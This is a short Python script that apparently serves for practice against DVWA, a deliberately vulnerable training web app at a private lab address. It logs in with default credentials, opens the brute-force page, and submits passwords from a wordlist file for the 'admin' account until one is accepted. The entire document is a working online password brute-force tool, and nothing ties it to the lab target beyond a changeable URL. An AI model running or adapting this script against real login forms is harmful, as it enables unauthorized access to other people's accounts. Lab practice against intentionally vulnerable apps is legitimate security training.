#!/usr/bin/env python

import mechanize
from bs4 import BeautifulSoup

formatters = {             
    'RED': '\033[91m',     
    'GREEN': '\033[92m',   
    'END': '\033[0m',      
}

#print 'Master is currently {RED}red{END}!'.format(**formatters)
#print 'Help make master {GREEN}green{END} again!'.format(**formatters)

br = mechanize.Browser()
url = "http://192.168.210.130/dvwa/login.php"
br.open(url)

wordlist = open("passwords.txt","r")
passwords = wordlist.read().splitlines()

def dvwa_login():
    br.select_form(nr=0)
    br.form['username'] = 'admin'
    br.form['password'] = 'password'
    br.submit()
    print("{GREEN}[+] Logged In{END}".format(**formatters))

dvwa_login()

br.follow_link(text_regex="Brute")
print("{GREEN}[+] Link Followed{END}".format(**formatters))

def easy_brute():
    for password in passwords:
        br.select_form(nr=0)
        br.form['username'] = 'admin'
        br.form['password'] = password
        response = br.submit()
        soup = BeautifulSoup(response.read(),'html.parser')
        if "password incorrect" not in soup.get_text():
            print("{GREEN}[+] Password Found:{END} ".format(**formatters) + password)
            break
print("{GREEN}[+] Launching Brute Force{END}".format(**formatters))
easy_brute()

